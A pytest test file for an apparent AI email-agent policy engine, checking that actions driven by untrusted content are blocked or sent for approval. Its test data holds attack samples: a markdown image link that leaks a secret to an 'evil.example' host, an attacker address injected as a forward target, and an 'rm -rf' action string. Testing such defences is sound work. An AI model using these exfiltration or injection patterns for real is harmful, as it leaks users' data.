"""Policy engine: every rule (positive and negative), strict vs balanced, origin recomputation,
the policy store, and property tests over all input combinations."""
import itertools
import random

import pytest

from shield import policy
from shield.policy import P1_EXCEPTIONS, PolicyConfig, PolicyStore, Signals, UserContext, decide
from shield.schemas import ACTIONS

TRUSTED = UserContext(allowed_domains=("trusted.example",), user_values=("friend@trusted.example",))
RANK = {"ALLOW": 0, "REQUIRE_APPROVAL": 1, "BLOCK": 2}


def rule(*args, **kwargs) -> str:
    return decide(*args, **kwargs).rule_id


# ------------------------------------------------------------------------- each rule

def test_p0_unknown_action_and_bad_inputs_block():
    assert decide("wire_money", None, "user", "SAFE").decision == "BLOCK"
    assert rule("wire_money", None, "user", "SAFE") == "P0"
    assert rule("summarize", None, "robot", "SAFE") == "P0"
    assert rule("summarize", None, "user", "MAYBE") == "P0"
    assert rule("summarize", None, "user", "SAFE", mode="lenient") == "P0"


def test_p0_internal_error_fails_closed(monkeypatch):
    def broken(*a, **k):
        raise RuntimeError("bug")

    monkeypatch.setattr(policy, "_balanced", broken)
    d = decide("summarize", None, "user", "SAFE")
    assert (d.decision, d.rule_id) == ("BLOCK", "P0")


@pytest.mark.parametrize("action", sorted(set(ACTIONS) - P1_EXCEPTIONS))
def test_p1_untrusted_origin_blocks(action):
    d = decide(action, "x@evil.example", "untrusted_content", "SAFE", mode="balanced")
    assert (d.decision, d.rule_id) == ("BLOCK", "P1")


@pytest.mark.parametrize("action", sorted(P1_EXCEPTIONS))
def test_p1_exceptions_are_allowed_in_balanced_mode(action):
    assert decide(action, None, "untrusted_content", "SAFE", mode="balanced").decision == "ALLOW"


def test_p2_execute_instruction_always_blocks():
    for mode, label in itertools.product(("strict", "balanced"), ("SAFE", "SUSPICIOUS", "DANGEROUS")):
        d = decide("execute_instruction_from_content", None, "user", label, mode=mode)
        assert (d.decision, d.rule_id) == ("BLOCK", "P2")


def test_e_egress_blocks_links_to_unlisted_domains():
    d = decide("draft_reply", None, "user", "SAFE", TRUSTED, mode="balanced",
               content="Thanks! ![x](https://collect.evil.example/p.png?d=secret)")
    assert (d.decision, d.rule_id) == ("BLOCK", "E-EGRESS")
    ok = decide("draft_reply", None, "user", "SAFE", TRUSTED, mode="balanced",
                content="See https://docs.trusted.example/plan")
    assert ok.rule_id == "P7"


def test_p3_dangerous_consequential_blocks():
    d = decide("forward_email", "friend@trusted.example", "user", "DANGEROUS", TRUSTED, mode="balanced")
    assert (d.decision, d.rule_id) == ("BLOCK", "P3")
    assert rule("summarize", None, "user", "DANGEROUS", mode="balanced") == "P7"


def test_e_financial_needs_approval():
    d = decide("draft_reply", None, "user", "SAFE", TRUSTED, mode="balanced", content="My OTP is 482913")
    assert (d.decision, d.rule_id) == ("REQUIRE_APPROVAL", "E-FINANCIAL")
    assert rule("draft_reply", None, "user", "SAFE", TRUSTED, mode="balanced", content="See you at 5") == "P7"


def test_p4_recipient_outside_allowlist():
    d = decide("send_reply", "stranger@other.example", "user", "SAFE",
               UserContext(user_values=("stranger@other.example",)), mode="balanced")
    assert (d.decision, d.rule_id) == ("REQUIRE_APPROVAL", "P4")
    allowed = decide("send_reply", "friend@trusted.example", "user", "SAFE", TRUSTED, mode="balanced")
    assert allowed.rule_id != "P4"


def test_p5_suspicious_consequential():
    d = decide("open_link", "https://x.example", "user", "SUSPICIOUS", mode="balanced")
    assert (d.decision, d.rule_id) == ("REQUIRE_APPROVAL", "P5")
    assert rule("open_link", "https://x.example", "user", "SAFE", mode="balanced") == "P8"


def test_p6_delete_needs_approval():
    assert rule("delete_email", None, "user", "SAFE", mode="balanced") == "P6"
    assert rule("quarantine_email", None, "user", "SAFE", mode="balanced") != "P6"


@pytest.mark.parametrize("action", ["summarize", "draft_reply", "report_phishing", "quarantine_email"])
def test_p7_allows_safe_actions(action):
    d = decide(action, None, "user", "SAFE", mode="balanced")
    assert (d.decision, d.rule_id) == ("ALLOW", "P7")


def test_p8_default_requires_approval():
    d = decide("add_calendar_event", None, "user", "SAFE", mode="balanced")
    assert (d.decision, d.rule_id) == ("REQUIRE_APPROVAL", "P8")
    assert rule("summarize", None, "user", "SAFE", mode="balanced") != "P8"


def test_s1_strict_mode_pauses_on_any_signal():
    d = decide("summarize", None, "user", "SAFE", mode="strict", signals=Signals(findings=1))
    assert (d.decision, d.rule_id) == ("REQUIRE_APPROVAL", "S1") and "1 detector finding" in d.reason
    clean = decide("summarize", None, "user", "SAFE", mode="strict", signals=Signals())
    assert clean.decision == "ALLOW"


def test_strict_without_signals_uses_the_label():
    assert rule("summarize", None, "user", "SUSPICIOUS", mode="strict") == "S1"
    assert rule("summarize", None, "user", "SAFE", mode="strict") == "P7"


def test_default_mode_comes_from_policy_yml():
    assert policy.load_config().mode == "strict"
    assert rule("summarize", None, "user", "SUSPICIOUS") == "S1"


# --------------------------------------------------------------------- origin

def test_target_not_typed_by_user_counts_as_untrusted():
    ctx = UserContext(user_values=("me@home.example",))
    assert policy.resolve_origin("user", "attacker@evil.example", ctx) == "untrusted_content"
    assert policy.resolve_origin("user", " ME@home.example ", ctx) == "user"
    assert policy.resolve_origin("untrusted_content", "me@home.example", ctx) == "untrusted_content"


def test_planner_cannot_launder_an_injected_target():
    d = decide("forward_email", "attacker@evil.example", "user", "SAFE", TRUSTED, mode="balanced")
    assert (d.decision, d.rule_id) == ("BLOCK", "P1")


# --------------------------------------------------------------------- properties

TARGETS = (None, "", "friend@trusted.example", "attacker@evil.example", "https://evil.example/x")
CONTENTS = (None, "Thanks, see you", "see https://evil.example/p.png", "OTP is 123456")
SIGNALS = (None, Signals(), Signals(findings=1))
CONTEXTS = (None, TRUSTED)


def _all_inputs():
    return itertools.product(ACTIONS + ("unknown_action",), ("user", "untrusted_content"),
                             ("SAFE", "SUSPICIOUS", "DANGEROUS"), TARGETS, CONTENTS, SIGNALS, CONTEXTS)


def test_property_untrusted_origin_is_never_allowed_outside_exceptions():
    checked = 0
    for action, origin, label, target, content, signals, ctx in _all_inputs():
        for mode in ("strict", "balanced"):
            d = decide(action, target, origin, label, ctx, mode=mode, signals=signals, content=content)
            if origin == "untrusted_content" and d.decision == "ALLOW":
                assert action in P1_EXCEPTIONS, (action, target, label, mode)
            checked += 1
    assert checked == 13 * 2 * 3 * 5 * 4 * 3 * 2 * 2  # every combination, in both modes


def test_property_strict_is_never_looser_than_balanced():
    for action, origin, label, target, content, signals, ctx in _all_inputs():
        strict = decide(action, target, origin, label, ctx, mode="strict", signals=signals, content=content)
        balanced = decide(action, target, origin, label, ctx, mode="balanced", signals=signals, content=content)
        assert RANK[strict.decision] >= RANK[balanced.decision]
        if balanced.rule_id in ("P0", "P1", "P2", "E-EGRESS"):
            assert strict == balanced


def test_property_decisions_are_deterministic():
    for action, origin, label, target, content, signals, ctx in list(_all_inputs())[::7]:
        a = decide(action, target, origin, label, ctx, mode="strict", signals=signals, content=content)
        b = decide(action, target, origin, label, ctx, mode="strict", signals=signals, content=content)
        assert a == b


def test_property_random_sequences_with_mode_changes():
    rnd = random.Random(20261022)
    store = PolicyStore(PolicyConfig(mode="strict"))
    alphabet = "abcdefghijklmnopqrstuvwxyz@./:_ -"
    for _ in range(3000):
        if rnd.random() < 0.05:
            store.set_mode(rnd.choice(("strict", "balanced")), confirm=True)
        action = rnd.choice(ACTIONS + ("", "rm -rf", "SEND_REPLY", "summarize "))
        target = rnd.choice((None, "".join(rnd.choice(alphabet) for _ in range(rnd.randint(0, 30)))))
        content = rnd.choice((None, "".join(rnd.choice(alphabet) for _ in range(rnd.randint(0, 60)))))
        label = rnd.choice(("SAFE", "SUSPICIOUS", "DANGEROUS"))
        d = decide(action, target, "untrusted_content", label, TRUSTED, mode=store.get().mode, content=content)
        if d.decision == "ALLOW":
            assert action in P1_EXCEPTIONS
        if action not in ACTIONS:
            assert d.decision == "BLOCK"


# --------------------------------------------------------------------- policy store

def test_loosening_needs_confirmation_and_is_audited():
    events = []
    store = PolicyStore(PolicyConfig(mode="strict"), on_change=events.append)
    with pytest.raises(PermissionError):
        store.set_mode("balanced")
    assert store.get().mode == "strict" and events == []
    store.set_mode("balanced", confirm=True, actor="human:op")
    assert store.get().mode == "balanced" and events[0]["new"] == "balanced" and events[0]["actor"] == "human:op"
    store.set_mode("strict")  # tightening needs no confirmation
    assert store.get().mode == "strict"


def test_adding_trusted_domains_needs_confirmation():
    store = PolicyStore(PolicyConfig())
    with pytest.raises(PermissionError):
        store.set_allowed_domains(["partner.example"])
    store.set_allowed_domains(["Partner.Example."], confirm=True)
    assert store.get().allowed_domains == ("partner.example",)
    store.set_allowed_domains([])  # removing never needs confirmation
    assert store.get().allowed_domains == ()


@pytest.mark.parametrize("bad", ["10.0.0.1", "not a domain", "", "-bad-.example"])
def test_invalid_domains_are_rejected(bad):
    with pytest.raises(ValueError):
        PolicyStore(PolicyConfig()).set_allowed_domains([bad], confirm=True)


def test_change_is_not_applied_if_audit_fails():
    def fail(_):
        raise RuntimeError("audit down")

    store = PolicyStore(PolicyConfig(mode="strict"), on_change=fail)
    with pytest.raises(RuntimeError):
        store.set_mode("balanced", confirm=True)
    assert store.get().mode == "strict"
